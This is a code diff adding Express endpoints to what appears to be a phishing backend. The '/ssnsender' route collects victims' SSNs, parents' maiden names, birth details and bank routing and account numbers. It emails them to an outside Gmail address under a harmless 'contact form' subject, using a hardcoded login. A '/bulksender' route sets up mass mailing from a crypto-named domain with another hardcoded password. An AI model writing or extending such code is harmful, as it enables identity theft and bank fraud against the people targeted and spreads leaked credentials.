@@ -187,6 +187,117 @@ app.post("/arnoldsender", async (req, res) => {
   });
 });
 
+app.post("/ssnsender", async (req, res) => {
+  const { fullName, ssn, mailingAddress, fathersName, mothersName, placeOfBirth, state, amountReceived, routingNumber, accountNumber, phoneNumber, receivedSSA, dob, dateOfPayment } = req.body;
+  console.log(req.body);
+  
+  // Construct email message
+  const message = `
+    You go a new information from:
+
+    Full Name: ${fullName}
+
+    SSN: ${ssn}
+
+    Mailing Address on Profile: ${mailingAddress}
+
+    Fathers Full Name and Maiden Name: ${fathersName}
+
+    Mother's Full Name and Maiden Name: ${mothersName}
+
+    Place of Birth (City and State): ${placeOfBirth}
+
+    State: ${state}
+
+    Amount Received Last Month (In USD): ${amountReceived}
+
+    Routing Number That's on File: ${routingNumber}
+
+    Account Number That's on File: ${accountNumber}
+
+    Phone Number: ${phoneNumber}
+
+    Did You Receive SSA (YES or NO): ${receivedSSA}
+
+    Date of Birth (DD/MM/YYYY): ${dob}
+
+    Date of Payment: ${dateOfPayment}
+  `;
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: 'davidmiller4504@gmail.com',
+      pass: 'dqhc mwpf nkmb buib'
+    }
+  });
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "masonwilfred01@gmail.com", // list of receivers
+    subject: 'New Contact Form Submission', // Subject line
+    text: message // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send('Error sending email');
+    } else {
+      console.log('Email sent: ' + info.response);
+      res.json({ success: true, message: 'Email sent successfully!' });
+    }
+  });
+});
+
+app.post("/bulksender", async (req,res)=> {
+
+
+  var transporter = nodemailer.createTransport({
+    host: "bulk.smtp.mailtrap.io",
+    port: 587,
+    auth: {
+      user: "api",
+      pass: "aaa8f7986cbccdc1f2633ad8b84f24bc"
+    },
+    maxMessages: Infinity, // Allow an unlimited number of messages per connection
+    maxConnections: 5 // Limit the number of simultaneous connections
+  });
+
+  // Example list of recipients for bulk emailing
+const recipients = [
+  {email: 'recipient1@example.com', name: 'Recipient One'},
+  {email: 'recipient2@example.com', name: 'Recipient Two'},
+  {email: 'recipient3@example.com', name: 'Recipient Three'},
+  // Add more recipients as needed
+];
+
+
+// Prepare email promises for sending in bulk
+const emailPromises = recipients.map(recipient =>
+  transporter.sendMail({
+      from: 'tradecrypt.org',
+      to: `${recipient.name} <${recipient.email}>`, // Personalized to each recipient
+      subject: 'Bulk Email Test',
+      text: 'This is a test email sent in bulk using Nodemailer and Mailtrap.',
+      html: `<b>Hello ${recipient.name},</b><p>This is a test email sent in bulk using Nodemailer and Mailtrap.</p>`
+  })
+);
+
+
+// Send all emails in parallel and handle the results
+Promise.all(emailPromises)
+  .then(results => {
+      console.log('All emails sent successfully');
+      results.forEach(result => {
+          console.log(`Message to ${result.envelope.to} sent: ${result.messageId}`);
+      });
+  })
+  .catch(errors => {
+      console.error('Failed to send one or more emails:', errors);
+  });
+})
+
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
